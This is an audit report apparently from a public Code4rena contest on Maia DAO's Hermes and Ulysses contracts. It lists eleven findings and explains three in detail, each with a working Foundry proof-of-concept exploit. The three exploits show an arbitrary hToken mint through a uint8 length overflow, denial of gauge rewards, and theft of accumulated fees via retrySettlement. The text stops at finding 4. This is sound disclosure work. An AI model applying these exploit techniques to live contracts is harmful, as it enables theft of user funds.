# About the Audit
This security review was conducted as an involvement in a public and open-source competition hosted by code4arena & Maia Dao. 
The team's efforts in securing the project managed to earn a top 3 finish, receiving praise from the developers, judging staff & other participants

The auditing team is known as Voyvoda and includes 3 Blockchain Security Experts
* alexxander $~~~~~~$ | twitter: https://twitter.com/__alexxander_
* deadrosesxyz $~$ | twitter: https://twitter.com/deadrosesxyz
* gogotheauditor | twitter: https://twitter.com/gogotheauditor
  
# About Maia Dao
Maia Dao is a DeFi Ecosystem consisting of 4 main projects - Maia, Hermes, Talo & Ulyses.
 
The audit primaraly focused on veryfiying and securing - 
* Hermes - a governance & rewards distribution system.
* Ulyses - an omnichain & virtual liquidity system.

# Findings List
| # | Issue Title                                                             | Severity | Status       |
| ------ | ----------------------------------------------------------------- | -------- | ------------ |
| [[1]](#my-section1) | Attacker can mint arbitrary amount of `hToken` on RootChain                                                                   | Critical | Fixed |
| [[2]](#my-section2) | Re-adding a deprecated gauge in a new epoch before calling `updatePeriod()` / `queueRewardsForCycle()` will leave some gauges without rewards.  | Critical | Fixed |
| [[3]](#my-section3) | Attacker can steal Accumulated Awards from RootBridgeAgent by abusing `retrySettlement()`                                     | High     | Fixed |
| [[4]](#my-section4) | `sweep()` doesn’t convert WETH to ETH                                                                                         | High     | Fixed |
| [[5]](#my-section5) | `retrySettlement()` should revert on a Settlement that has been redeemed or is non existing, crediting back ETH to user       | Medium   | Fixed |
| [[6]](#my-section6) | UniV3 Staker `restakeToken(...)` calls unstakeToken(...)` with wrong argument                                                 | Medium   | Fixed |
| [[7]](#my-section7) | BoostAggregator loss of funds for low-value rewards                                                                           | Medium   | Fixed |
| [[8]](#my-section8) | BoostAggregator owner can set fees to 100% and steal all of the users' rewards                                                | Medium   | Fixed |
| [[9]](#my-section9) | Deprecating a gauge before `queueRewardsForCycle()` in a new cycle leads to loss of rewards                                   | Medium   | Acknowledged |
| [[10]](#my-section10) | Adversary can grief wrongfully sent NFTs to BoostAggregator.sol                                                             | Low      | Fixed |
| [[11]](#my-section11) | Adversary can restrain users from withdrawing their NFTs from UniswapV3Staker                                               | Low      | Acknowledged |

# Detailed Explanation

## <a id="my-section1"></a> 1. Attacker can mint arbitrary amount of `hToken` on RootChain

### Severity
Critical

### Impact
Adversary can construct an attack vector that let’s him mint arbitrary amount of hToken’s on the Root Chain.

### Vulnerable code
[link1](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L275-L316) |
[link2](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L860-L1174) |
[link3](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgentExecutor.sol#L259-L299) |
[link4](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L404-L426) |
[link5](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootPort.sol#L276-L284) |

### Description
The `callOutSignedAndBridgeMultiple(...)` function is supposed to bridge multiple tokens to a destination chain and also carry the msg.sender so that the tokens can be credited to msg.sender's VirtualAccount. An attacker can call the function with such `DepositMultipleInputParams _dParams` that take advantage of several weaknesses contained within the function.

* Weakness #1 is that the supplied array of tokens `address[] hTokens` in `_dParams` is not checked if it exceeds 256, this causes an obvious issue where if hTokens length is > 256 the recorded length in packedData will be wrong since it's using an unsafe cast to uint8 and will overflow - `uint8(_dParams.hTokens.length)`.

* Weakness #2 arises in the subsequent internal function `_depositAndCallMultiple(...)`, where the only check done on the supplied `hTokens`, `tokens`, `amounts` & `deposits` arrays is if the lengths match, however, there is no check if the length is the same as the one passed earlier to packedData.

* Weakness #3 is that `bridgeOutMultiple(...)`, called within`_createDepositMultiple(...)`, allows for supplying any address in the `hTokens` array since it only performs operations on these addresses if - `_deposits[i] > 0` or `_amounts[i] - _deposits[i] > 0` - in other words - if we set `deposits[i] = 0` & `amounts[i] = 0` we can supply ANY address in `hTokens[i]`.

### Constructing the exploit vector
An attacker can construct such DepositMultipleInput _dParams where `address[] hTokens` will have a length of 257 where all entries, except `hTokens[1]`, `hTokens[2]` & `hTokens[3]` , will contain the Branch address of the same `hToken` (note that in the examined functions above there is no restriction to supply the same `hToken` address multiple times).

In a similar way `address[] tokens` will have length of 257, however, here all entries will contain the underlying token (it is crucial to include the address of the underlying token to bypass `_normalizeDecimals()`).

Next `uint256[] amounts` will be of length 257 where all entries will contain 0. Similarly,

`uint256[] deposits` will be of length 257 where all entries will contain 0. In such configuration the attacker is able to supply a malicious `hToken` address as per weakness #3.

The crucial part now is that `hTokens[1]` will contain the address of the underlying token - this is needed to later bypass the params check on the RootChain.

`hTokens[2]` & `hTokens[3]` will contain the attacker’s malicious payload address that when converted to bytes and then uint256 will represent the arbitrary amount of tokens that the attacker will mint (this conversion will happen on the RootChain).

The attack vector is inline with the general encoding scheme displayed below, the important note is that Length will contain a value of 1 instead of 257 which will disrupt the decoding on the RootBranch. More details about the encoding can be found in `IRootBridgeAgent.sol`.
```solidity
+--------+----------+--------+--------------+---------------------------+---------------------+----------------------+-----------------------+---------+------+----------+
|  Flag  |  Signer  | Length | depositNonce | hTokens[0], [1] ... [256] | tokens[0] ... [256] | amounts[0] ... [256] | deposits[0] ... [256] | toChain | data |   gas    |
+--------+----------+--------+--------------+---------------------------+---------------------+----------------------+-----------------------+---------+------+----------+
| 1 byte | 20 bytes | 1 byte |   4 bytes    |       32 bytes * 257      |    32 bytes * 257   |    32 bytes * 257    |     32 bytes * 257    | 3 bytes | any  | 32 bytes |
+--------+----------+--------+--------------+---------------------------+---------------------+----------------------+-----------------------+---------+------+----------+
```
### Supplying the exploit vector
The entry point for a message on the Root Chain is `anyExecute(bytes calldata data)` in `RootBridgeAgent.sol` - this will be called by Multichain’s AnycallExecutor. The function will unpack and navigate the supplied flag 0x06 - corresponding to `callOutSignedAndBridgeMultiple(...)` that was invoked on the Branch Chain.

Next `executeSignedWithDepositMultiple(...)` will be invoked residing in `RootBridgeAgentExecutor.sol`, which will subsequently call `_bridgeInMultiple(...)`, however, the amount of data passed to `_bridgeInMultiple(...)` depends on the packed length of the hTokens array.

Now `_bridgeInMultiple(...)` will unpack the `_dParams` where `numOfAssets = 1`, hence only 1 iteration, and will populate a set with in reality the first 4 entries of the supplied hTokens[] in the attack vector -

`hTokens[0] = hToken address`,

`tokens[0] = token address`,

`amounts[0] = malicious address payload cast to uint256`,

`deposits[0] = malicious address payload cast to uint256`.

Subsequently `bridgeInMultiple(...)` is called in `RootBridgeAgent.sol`, where `bridgeIn(...)` is called for every set of hToken, token, amount & deposit - one iteration in the attack scenario.

`bridgeIn(...)` now performs the critical `checkParams` from the CheckParamsLib library where if only 1 of 3 conditions is true we will have a revert.

The first check is revert if `_dParams.amount < _dParams.deposit` - this is false since amount & deposit are equal to the uint256 cast of the bytes packing of the malicious address payload.

The second check is:
```solidity
(_dParams.amount > 0 && !IPort(_localPortAddress).isLocalToken(_dParams.hToken, _fromChain))
```
Here it’s true amount > 0 , however, `_dParams.hToken` is the first entry `hTokens[0]` of the attack vector’s `hTokens[]` array, therefore, it is a valid address & `isLocalToken(…)` will return true and will be negated by ! which will make the statement false because of &&, therefore, it is bypassed.

The third check is:
```solidity
(_dParams.deposit > 0 && !IPort(_localPortAddress).isUnderlyingToken(_dParams.token, _fromChain))
```
here it’s true `deposit > 0` , however, `_dParams.token` is the second entry `hTokens[1]` of the attack vector’s `hTokens[]` array, therefore, it is a valid underlying address & `isUnderlyingToken(…)` will return true and will be negated by ! which will make the statement false because of &&, therefore, it is bypassed.

Now in the Root Port `bridgeToRoot(...)` will check if the globalAddress is valid and it is since we got it from the valid `hTokens[0]` entry in the constructed attack. Then `_amount - _deposit = 0` , therefore, no tokens will be transferred and finally the critical line if `(_deposit > 0) mint(_recipient, _hToken, _deposit, _fromChainId)` here `_deposit` is the malicious address payload that was packed to bytes and then unpacked and cast to uint256 & `_hToken` is the global address that we got from `hTokens[0]` back in the unpacking, therefore whatever the value of the uint256 representation of the malicious address is will be minted to the attacker.

### Coded POC
Coded PoC
Copy the two functions `testArbitraryMint` & `_prepareAttackVector` in `test/ulysses-omnichain/RootTest.t.sol` and place them in the `RootTest` contract after the setup.

Execute with `forge test --match-test testArbitraryMint -vv`

Result - 800000000 minted tokens for free in attacker’s Virtual Account

```solidity
function testArbitraryMint() public {
        
        // setup function used by developers to add local/global tokens in the system
        testAddLocalTokenArbitrum();

        // set attacker address & mint 1 ether to cover gas cost
        address attacker = address(0xAAAA);
        hevm.deal(attacker, 1 ether);
        
        // get avaxMockAssetHtoken global address that's on the Root
        address globalAddress = rootPort.getGlobalTokenFromLocal(avaxMockAssethToken, avaxChainId);
    
        // prepare attack vector
        bytes memory params = "";
        DepositMultipleInput memory dParams = _prepareAttackVector();
        uint128 remoteExecutionGas = 200_000_000_0;

        console2.log("------------------");
        console2.log("------------------");
        console2.log("ARBITRARY MINT LOG");

        console2.log("Attacker address", attacker);
        console2.log("Avax h token address",avaxMockAssethToken);
        console2.log("Avax underlying address", address(avaxMockAssetToken));

        console2.log("Attacker h token balance", ERC20hTokenBranch(avaxMockAssethToken).balanceOf(attacker));
        console2.log("Attacker underlying balance", avaxMockAssetToken.balanceOf(attacker));

        // execute attack
        hevm.prank(attacker);
        avaxMulticallBridgeAgent.callOutSignedAndBridgeMultiple{value: 0.00005 ether}(params, dParams, remoteExecutionGas);
        
        // get attacker's virtual account address
        address vaccount = address(rootPort.getUserAccount(attacker));

        console2.log("Attacker h token balance avax", ERC20hTokenBranch(avaxMockAssethToken).balanceOf(attacker));        
        console2.log("Attacker underlying balance avax", avaxMockAssetToken.balanceOf(attacker));

        console2.log("Attacker h token balance root", ERC20hTokenRoot(globalAddress).balanceOf(vaccount));
    
        console2.log("ARBITRARY MINT LOG END");
		    console2.log("------------------");

    }

    function _prepareAttackVector() internal view returns(DepositMultipleInput memory) {
        
        // hToken address
        address addr1 = avaxMockAssethToken;

        // underlying address
        address addr2 = address(avaxMockAssetToken);

        // 0x2FAF0800 when encoded to bytes and then cast to uint256 = 800000000 
        address malicious_address = address(0x2FAF0800);
        
        uint256 amount1 = 0;
        uint256 amount2 = 0;

        uint num = 257;
        address[] memory htokens = new address[](num);
        address[] memory tokens = new address[](num);
        uint256[] memory amounts = new uint256[](num);
        uint256[] memory deposits = new uint256[](num);

        for(uint i=0; i<num; i++) {
            htokens[i] = addr1;
            tokens[i] = addr2;
            amounts[i] = amount1;
            deposits[i] = amount2;
        }
    
        // address of the underlying token
        htokens[1] = addr2;
      
        // copy of entry containing the arbitrary number of tokens
        htokens[2] = malicious_address;
        
        // entry containing the arbitrary number of tokens -> this one will be actually fed to mint on Root
        htokens[3] = malicious_address;
       
        uint24 toChain = rootChainId;

        // create input
        DepositMultipleInput memory input = DepositMultipleInput({
            hTokens:htokens,
            tokens:tokens,
            amounts:amounts,
            deposits:deposits,
            toChain:toChain
        });

        return input;

    }
```
### Recommendation
Enforce more strict checks around input param validation on bridging multiple tokens.

## 2. <a id="my-section2"></a> Re-adding a deprecated gauge in a new epoch before calling `updatePeriod()` / `queueRewardsForCycle()` will leave some gauges without rewards.
### Severity
Critical
### Impact
One or more gauge will remain without rewards. Malicious user can DOS a selected gauge from receiving rewards.
### Vulnerable Code
[link1](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Gauges.sol#L174-L181)
[link2](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Gauges.sol#L407-L422)
[link3](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/rewards/rewards/FlywheelGaugeRewards.sol#L72-L104)
### Description
When a gauge is deprecated its weight is subtracted from `totalWeight` , however, the weight of the gauge itself could remain different from 0 (it’s up to the users to remove their votes). That’s reflected in `_addGauge()`.
```solidity
function _addGauge(address gauge) internal returns (uint112 weight) {
        // some code ... 

        // Check if some previous weight exists and re-add to the total. Gauge and user weights are preserved.
        weight = _getGaugeWeight[gauge].currentWeight;
        if (weight > 0) {
            _writeGaugeWeight(_totalWeight, _add112, weight, currentCycle);
        }

        emit AddGauge(gauge);
    }
```
When `addGauge(...)` is invoked to re-add a gauge that was previously deprecated and still contains votes - `_writeGaugeWeight(...)` is called to add the gauge’s weight to `totalWeight` . When the write operation to `totalWeight` is performed during a new cycle but before `updatePeriod()` or `queueRewardsForCycle()` are called we will have

`totalWeight.storedWeight = currentWeight (the weight before update) `,

`totalWeight.currentWeight = newWeight (the new weight)` &

`totalWeight.currentCycle = cycle (the updated new cycle)`

The problem is that when now `queueRewardsForCycle()` is called and subsequently in the call chain `calculateGaugeAllocation(...)` is called which in turn will request the `totalWeight` through `_getStoredWeight(_totalWeight, currentCycle)` we will read the old `totalWeight` i.e `totalWeight.storedWeight` because `totalWeight.currentCycle < currentCycle` is false, because the cycle was already updated during the `addGauge(...)` call.

This will now cause a wrong calculation of the rewards since we have 1 extra gauge but the value of `totalWeight` is less than what it is in reality. Therefore the sum of the rewards among the gauges for the cycle will be more than the total sum allocated by the minter. In other words the function in the code snippet below will be called for every gauge including the re-added but total is less than what it has to be.
```solidity
function calculateGaugeAllocation(address gauge, uint256 quantity) external view returns (uint256) {
        if (_deprecatedGauges.contains(gauge)) return 0;
        uint32 currentCycle = _getGaugeCycleEnd();

        uint112 total = _getStoredWeight(_totalWeight, currentCycle);
        uint112 weight = _getStoredWeight(_getGaugeWeight[gauge], currentCycle);
        return (quantity * weight) / total;
    }
```
This can now cause several areas of concern. First, in the presented scenario where a gauge is re-added with weight > 0 `beforequeueRewardsForCycle(...)`, the last gauge (or perhaps the last few gauges, depends on the distribution of weight) among the active gauges that calls `getAccruedRewards()` won’t receive awards since there will be less rewards than what’s recorded in the gauge state. Second, in a scenario where we might have several gauges with a “whale” gauge that holds a majority of votes and therefore will have a large amount of rewards, a malicious actor can monitor for when a some gauge is re-added and frontrun `getAccruedRewards()` ,potentially through `newEpoch()` in BaseV2Gauge , for all gauges, except the “whale”, and achieving a DOS where the “whale” gauge won’t receive the rewards for the epoch and therefore the reputation of it will be damaged. This can be done for any gauge, but will have more significant impact in the case where a lot of voters are denied their awards.

### Coded POC
Initialy there are 4 gauges with (2e18 | 2e18 | 6e18 | 4e18) votes respectively. The gauge with 4e18 votes is removed for 1 cycle and then re-added during a new cycle but before queuing of the rewards. The 6e18 gauge withdraws its rewards and the 4e18 gauge withdraws its rewards, the two gauges with 2e18 votes are bricked and can’t withdraw rewards.

Copy the functions `testInitialGauge2` & `testDeprecatedAddedGauge2` & `helper_gauge_state` in `/test/rewards/rewards/FlywheelGaugeRewardsTest.t.sol`

Execute with `forge test --match-test testDeprecatedAddedGauge2 -vv`

Result - 2 gauges with 2e18 votes will revert after trying to collect rewards.
```solidity
function testInitialGauge2() public {
        uint256 amount_rewards;
        
        // rewards is 100e18
        
        // add 4 gauges, 2x/2x/6x/4x split
        gaugeToken.addGauge(gauge1);
        gaugeToken.addGauge(gauge2);
        gaugeToken.addGauge(gauge3);
        gaugeToken.addGauge(gauge4);

        gaugeToken.incrementGauge(gauge1, 2e18);
        gaugeToken.incrementGauge(gauge2, 2e18);
        gaugeToken.incrementGauge(gauge3, 6e18);
        gaugeToken.incrementGauge(gauge4, 4e18);

        
        console.log("--------------Initial gauge state--------------");
        helper_gauge_state();

        // do one normal cycle of rewards
        hevm.warp(block.timestamp + 1000);
        amount_rewards = rewards.queueRewardsForCycle();
        
        console.log("--------------After 1st queueRewardsForCycle state--------------");
        console.log('nextCycleQueuedRewards', amount_rewards);
        helper_gauge_state();
        
        // collect awards
        hevm.prank(gauge1);
        rewards.getAccruedRewards();
        hevm.prank(gauge2);
        rewards.getAccruedRewards();
        hevm.prank(gauge3);
        rewards.getAccruedRewards();
        hevm.prank(gauge4);
        rewards.getAccruedRewards();

        console.log("--------------After getAccruedRewards state--------------");
        helper_gauge_state();
    }
    function testDeprecatedAddedGauge2() public {
        uint256 amount_rewards;
        // setup + 1 normal cycle
        testInitialGauge2();
        // remove gauge
        gaugeToken.removeGauge(gauge4);

        // do one more normal cycle with only 3 gauges
        hevm.warp(block.timestamp + 1000);
        amount_rewards = rewards.queueRewardsForCycle();
        console.log("--------------After 2nd queueRewardsForCycle state--------------");
        console.log('nextCycleQueuedRewards', amount_rewards);
        // examine state
        helper_gauge_state();

        hevm.prank(gauge1);
        rewards.getAccruedRewards();
        hevm.prank(gauge2);
        rewards.getAccruedRewards();
        hevm.prank(gauge3);
        rewards.getAccruedRewards();
        console.log("--------------After getAccruedRewards state--------------");
        // examine state
        helper_gauge_state();

        // A new epoch can start for 1 more cycle
        hevm.warp(block.timestamp + 1000);
        
        // Add the gauge back, but before rewards are queued
        gaugeToken.addGauge(gauge4);
        amount_rewards = rewards.queueRewardsForCycle();

        console.log("--------------After 3rd queueRewardsForCycle state--------------");
        console.log('nextCycleQueuedRewards', amount_rewards);
        // examine state
        helper_gauge_state();

        // this is fine
        hevm.prank(gauge3);
        rewards.getAccruedRewards();
        
        // this is fine
        hevm.prank(gauge4);
        rewards.getAccruedRewards();

        // this reverts
        hevm.prank(gauge1);
        rewards.getAccruedRewards();
        
        // this reverts, same weight as gauge 1
        hevm.prank(gauge2);
        rewards.getAccruedRewards();

        console.log("--------------After getAccruedRewards state--------------");
        // examine state
        helper_gauge_state();

    }
function helper_gauge_state() public view {
        console.log('FlywheelRewards balance', rewardToken.balanceOf(address(rewards)));
        console.log('gaugeCycle', rewards.gaugeCycle());
        address[] memory gs = gaugeToken.gauges();
        for(uint i=0; i<gs.length; i++) {
            console.log('-------------');
            (uint112 prior1, uint112 stored1, uint32 cycle1) = rewards.gaugeQueuedRewards(ERC20(gs[i]));
            console.log("Gauge ",i+1);
            console.log("priorRewards",prior1);
            console.log("cycleRewards",stored1); 
            console.log("storedCycle",cycle1);
        }
        console.log('-------------');
    }
```
### Recommendation
When a new cycle starts make sure gaguges are re-added after rewards are queued in a cycle.

## 3. <a id="my-section3"></a> Attacker can steal Accumulated Awards from RootBridgeAgent by abusing retrySettlement()
### Severity
High
### Impact
Accumulated Awards inside `RootBridgeAgent.sol` can be stolen. Accumulated Awards state will be compromised and awards will be stuck.
### Vulnerable Code
[link1](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L238-L272)
[link2](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L1018-L1054)
[link3](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L860-L1174)
[link4](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L244-L252)
[link5](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/VirtualAccount.sol#L41-L53)
[link6](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L1177-L1216)
[link7](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/MulticallRootRouter.sol#L345-L409)
### Description
#### Gas state
The gas related state inside RootBridgeAgent consists of

initialGas - a checkpoint that records `gasleft()` at the start of anyExecute that has been called by Multichain when we have a cross-chain call.

`userFeeInfo` - this is a struct that contains depositedGas which is the total amount of gas that the user has paid for on a BranchChain. The struct also contains `gasToBridgeOut` which is the amount of gas to be used for further cross-chain executions. The assumption is that `gasToBridgeOut < depositedGas` which is checked at the start of `anyExecute(...)`.

At the end of `anyExecute(...)` - `_payExecutionGas()` is invoked that calculates the supplied gas available for execution on the Root `avaliableGas = _depositedGas - _gasToBridgeOut` and then a check is performed if `availableGas` is enough to cover `minExecCost` , (which uses the `initialGas` checkpoint and subtracts a second `gasleft()` checkpoint to represent the end of execution on the Root. The difference between `availableGas` and `minExecCost` is profit for the protocol and is recorded inside `accumulatedFees` state variable.

#### Settlements
These are records of token’s that are “bridged out”(transferred) through the RootBridgeAgent to a BranchBridgeAgent . By default when a settlement is created it is Successful, unless execution on the Branch Chain fails and `anyFallback(...)` is called on the RootBridgeAgent which will set the settlement status as Failed. An example way to create a settlement will be to bridge out some assets from BranchBridgeAgent to RootBridgeAgent and embed extra data that represents another bridge operation from RootBridgeAgent to BranchBridgeAgent ( this flow passes through the MulticallRootRouter & could be the same branch agent as the first one or different) - at this point a settlement will be created. Moreover, a settlement could fail, for example, because of insufficient `gasToBridgeOut` provided by the user. In that case `anyFallback` is triggered on the RootBridgeAgent failing the settlement. At this time `retrySettlement()` becomes available to call for the particular settlement.

#### The exploit
Let’s first examine closely the `retrySettlement()` function.
```solidity
function retrySettlement(uint32 _settlementNonce, uint128 _remoteExecutionGas) external payable {
        //Update User Gas available.
        if (initialGas == 0) {
            userFeeInfo.depositedGas = uint128(msg.value);
            userFeeInfo.gasToBridgeOut = _remoteExecutionGas;
        }
        //Clear Settlement with updated gas.
        _retrySettlement(_settlementNonce);
    }
```
If `initialGas == 0` it is assumed that someone directly calls `retrySettlement(...)` and therefore has to deposit gas (msg.value), however, if `initialGas >` 0 it is assumed that `retrySettlement(...)` could be part of an `anyExecute(...)` call that contained instructions for the MulticallRootRouter to do the call through a VirtualAccount . Let’s assume the second scenario where `initialGas > 0` and examine the internal `_retrySettlement`.

First we have the call to `_manageGasOut(...)` , where again if `initialGas > 0` we assume that the `retrySettlement(...)` is within an anyExecute , and therefore `userFeeInfo` state is already set. From there we perform a `_gasSwapOut(...)` with `userFeeInfo.gasToBridgeOut` where we swap `gasToBridgeOut` amount of `wrappedNative` for gas tokens that are burned. Then back in the internal `_retrySettlement(...)` the new gas is recorded in the settlement record and the message is sent to a Branch Chain via anyCall.

The weakness here is that after we retry a settlement with `userFeeInfo.gasToBridgeOut` we do not set `userFeeInfo.gasToBridgeOut = 0` , which if we perform only 1 `retrySettlement(...)` is not exploitable, however, if we embed in a single `anyExecute(...)` several `retrySettlement(...)` calls it becomes obvious that we can pay 1 time for `gasToBridgeOut` on a Branch Chain and use it multiple times on the RootChain to fuel the many `retrySettlement(...)`.

The second feature that will be part of the attack is that on a Branch Chain we get refunded for the excess of `gasToBridgeOut` that wasn’t used for execution on the Branch Chain.

An attacker can trigger some number of `callOutAndBridge(...)` invocations from a Branch Chain with some assets and extra data that will call `callOutAndBridge(...)` on the Root Chain to transfer back these assets to the originating Branch Chain (or any other Branch Chain), however, the attacker will set minimum `depositedGas` to ensure execution on the Root Chain, but insufficient gas to complete remote execution on the Branch Chain, therefore, failing a number of settlements. The attacker will then follow with a `callOutAndBridge(...)` from a Branch Chain that contains extra data for the MutlicallRouter for the VirtualAccount to call `retrySettlement(...)` for every Failed settlement. Since we will have multiple `retrySettlement(...)` invocations inside a single anyExecute at some point the `gasToBridgeOut` sent to each settlement will become `>` the deposited gas and we will be spending from the Root Branch reserves (accumulated rewards). The attacker will redeem his profit on the Branch Chain, since he gets a gas refund there, and there will also be a mismatch between `accumulatedRewards` and the native currency in RootBridgeAgent , therefore, `sweep()` will revert and any `accumulatedRewards` that are left will be stuck.
### Coded POC
Copy the two functions `testGasIssue` & `_prepareDeposit` in `test/ulysses-omnichain/RootTest.t.sol` and place them in the `RootTest` contract after the setup.

Execute with `forge test --match-test testGasIssue -vv`

Result - attacker starts with 1000000000000000000 wei (1 ether) and has 1169999892307980000 wei (>1 ether) after execution of attack (the end number could be slightly different, depending on foundry version). Mismatch between accumulatedRewards and the amount of WETH in the contract.
```solidity
function testGasIssue() public {
        testAddLocalTokenArbitrum();
        console2.log("---------------------------------------------------------");
        console2.log("-------------------- GAS ISSUE START---------------------");
        console2.log("---------------------------------------------------------");
        // Accumulate rewards in RootBridgeAgent
        address some_user = address(0xAAEE);
        hevm.deal(some_user, 1.5 ether);
        // Not a valid flag, MulticallRouter will return false, that's fine, we just want to credit some fees
        bytes memory empty_params = abi.encode(bytes1(0x00));
        hevm.prank(some_user);
        avaxMulticallBridgeAgent.callOut{value: 1.1 ether }(empty_params, 0);

        // Get the global(root) address for the avax H mock token
        address globalAddress = rootPort.getGlobalTokenFromLocal(avaxMockAssethToken, avaxChainId);

        // Attacker starts with 1 ether
        address attacker = address(0xEEAA);
        hevm.deal(attacker, 1 ether);
        
        // Mint 1 ether of the avax mock underlying token
        hevm.prank(address(avaxPort));
        
        MockERC20(address(avaxMockAssetToken)).mint(attacker, 1 ether);
        
        // Attacker aproves the underlying token
        hevm.prank(attacker);
        MockERC20(address(avaxMockAssetToken)).approve(address(avaxPort), 1 ether);

        
        // Print out the amounts of WrappedNative & AccumulateAwards state 
        console2.log("RootBridge WrappedNative START",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));
        console2.log("RootBridge ACCUMULATED FEES START", multicallBridgeAgent.accumulatedFees());

        // Attacker's underlying avax mock token balance
        console2.log("Attacker underlying token balance avax", avaxMockAssetToken.balanceOf(attacker));

        // Prepare a single deposit with remote gas that will cause the remote exec from the root to branch to fail
        // We will have to mock this fail since we don't have the MultiChain contracts, but the provided 
        // Mock Anycall has anticipated for that

        DepositInput memory deposit = _prepareDeposit();
        uint128 remoteExecutionGas = 2_000_000_000;

        Multicall2.Call[] memory calls = new Multicall2.Call[](0);

        OutputParams memory outputParams = OutputParams(attacker, globalAddress, 500, 500);
        
        bytes memory params = abi.encodePacked(bytes1(0x02),abi.encode(calls, outputParams, avaxChainId));

        console2.log("ATTACKER ETHER BALANCE START", attacker.balance);

        // Toggle anyCall for 1 call (Bridge -> Root), this config won't do the 2nd anyCall
        // Root -> Bridge (this is how we mock BridgeAgent reverting due to insufficient remote gas)
        MockAnycall(localAnyCallAddress).toggleFallback(1);

        // execute
        hevm.prank(attacker);
        // in reality we need 0.00000002 (supply a bit more to make sure we don't fail execution on the root)
        avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 0.00000005 ether }(params, deposit, remoteExecutionGas);

        // Switch to normal mode 
        MockAnycall(localAnyCallAddress).toggleFallback(0);
        // this will call anyFallback() on the Root and Fail the settlement
        MockAnycall(localAnyCallAddress).testFallback();

        // Repeat for 1 more settlement
        MockAnycall(localAnyCallAddress).toggleFallback(1);
        hevm.prank(attacker);
        avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 0.00000005 ether}(params, deposit, remoteExecutionGas);
        
        MockAnycall(localAnyCallAddress).toggleFallback(0);
        MockAnycall(localAnyCallAddress).testFallback();
        
        // Print out the amounts of WrappedNative & AccumulateAwards state  after failing the settlements but before the attack 
        console2.log("RootBridge WrappedNative AFTER SETTLEMENTS FAILUER BUT BEFORE ATTACK",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));
        console2.log("RootBridge ACCUMULATED FEES AFTER SETTLEMENTS FAILUER BUT BEFORE ATTACK", multicallBridgeAgent.accumulatedFees());

        // Encode 2 calls to retrySettlement(), we can use 0 remoteGas arg since 
        // initialGas > 0 because we execute the calls as a part of an anyExecute()
        Multicall2.Call[] memory malicious_calls = new Multicall2.Call[](2);

        bytes4 selector = bytes4(keccak256("retrySettlement(uint32,uint128)"));

        malicious_calls[0] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,1,0)});
        malicious_calls[1] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,2,0)});
        // malicious_calls[2] = Multicall2.Call({target: address(multicallBridgeAgent), callData:abi.encodeWithSelector(selector,3,0)});
        
        outputParams = OutputParams(attacker, globalAddress, 500, 500);
        
        params = abi.encodePacked(bytes1(0x02),abi.encode(malicious_calls, outputParams, avaxChainId));

        // At this point root now has ~1.1 
        hevm.prank(attacker);
        avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 0.1 ether}(params, deposit, 0.09 ether);
        
        // get attacker's virtual account address
        address vaccount = address(rootPort.getUserAccount(attacker));

        console2.log("ATTACKER underlying balance avax", avaxMockAssetToken.balanceOf(attacker));
        console2.log("ATTACKER global avax h token balance root", ERC20hTokenRoot(globalAddress).balanceOf(vaccount));

        console2.log("ATTACKER ETHER BALANCE END", attacker.balance);
        console2.log("RootBridge WrappedNative END",WETH9(arbitrumWrappedNativeToken).balanceOf(address(multicallBridgeAgent)));
        console2.log("RootBridge ACCUMULATED FEES END", multicallBridgeAgent.accumulatedFees());
        console2.log("---------------------------------------------------------");
        console2.log("-------------------- GAS ISSUE END ----------------------");
        console2.log("---------------------------------------------------------");

    }

    function _prepareDeposit() internal returns(DepositInput memory) {
        // hToken address
        address addr1 = avaxMockAssethToken;

        // underlying address
        address addr2 = address(avaxMockAssetToken);

        uint256 amount1 = 500;
        uint256 amount2 = 500;

        uint24 toChain = rootChainId;

        return DepositInput({
            hToken:addr1,
            token:addr2,
            amount:amount1,
            deposit:amount2,
            toChain:toChain
        });

    }
```
### Recommendation
It is hard to conclude a particular fix but consider setting userFeeInfo.gasToBridgeOut = 0 after retrySettlement as part of the mitigation.

## 4. <a id="my-section4"></a> `sweep()` doesn’t convert WETH to ETH
### Severity
High
### Impact
Dao is unable to withdraw `accumulatedFees`.
### Vulnerable Code
